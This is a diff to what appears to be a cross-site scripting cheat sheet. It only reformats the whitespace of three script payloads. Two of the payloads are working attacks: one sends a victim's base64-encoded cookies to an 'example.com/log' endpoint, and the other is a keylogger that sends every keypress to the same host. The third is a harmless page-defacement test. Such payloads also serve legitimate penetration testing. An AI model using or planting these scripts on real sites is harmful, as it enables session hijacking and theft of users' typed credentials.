@@ -70,10 +70,9 @@ Assuming you control the `example.com` domain, you can also log base64-encoded s
 
 ```html
 <script>
-	fetch(
-		'https://example.com/log'
-			+ '?cookie='
-			+ btoa(document.cookie)
+	fetch('https://example.com/log'
+		+ '?cookie='
+		+ btoa(document.cookie)
 	);
 </script>
 ```
@@ -83,10 +82,9 @@ Simple keylogger (seems best to combine with cookie stealing, since otherwise it
 ```html
 <script>
 	document.onkeypress = function(e) {
-		fetch(
-			'https://example.com/log'
-				+ '?keypress='
-				+ btoa(e.key)
+		fetch('https://example.com/log'
+			+ '?keypress='
+			+ btoa(e.key)
 		);
 	}
 </script>
@@ -128,8 +126,7 @@ A much less annoying XSS test than the typical `<alert/>` popup is to use someth
 
 ```html
 <script>
-	xssTest
-		= document.querySelector("h1");
+	xssTest = document.querySelector("h1");
 	xssTest.innerHTML = "XSS was here!";
 </script>
 ```
